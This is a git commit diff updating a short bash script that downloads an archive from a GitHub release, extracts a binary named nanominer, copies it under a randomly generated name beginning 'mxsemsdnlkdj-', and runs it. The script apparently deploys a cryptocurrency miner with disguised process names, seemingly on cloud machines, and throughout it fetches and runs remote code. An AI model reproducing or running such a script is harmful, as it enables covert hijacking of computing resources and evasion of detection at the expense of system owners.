af5f4e38118b66066bf237d9b5efb0790af2638a
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2020-04-24 18:41:20 +0700

    Update pasc-data.sh

--- pasc-data.sh
+++ pasc-data.sh
@@ -1,16 +1,10 @@
 #!/bin/bash
 sudo apt-get update
 azure=mxsemsdnlkdj;
-mkdir /usr/local
-mkdir /usr/local/src
-rm -r /usr/local/src/$azure
+a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 rm -r platinum.tar.gz
 wget https://github.com/ts6aud5vkg/gpuissa/releases/download/ethv100/platinum.tar.gz
-tar xf platinum.tar.gz
+tar -xvzf platinum.tar.gz
 rm -r platinum.tar.gz
-mv platinum /usr/local/src/$azure
-a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
-cd /usr/local/src/$azure
-sudo cp uranium "$cpuname"
-echo $cpuname" is starting"
+sudo cp nanominer "$cpuname"
 ./"${cpuname}"
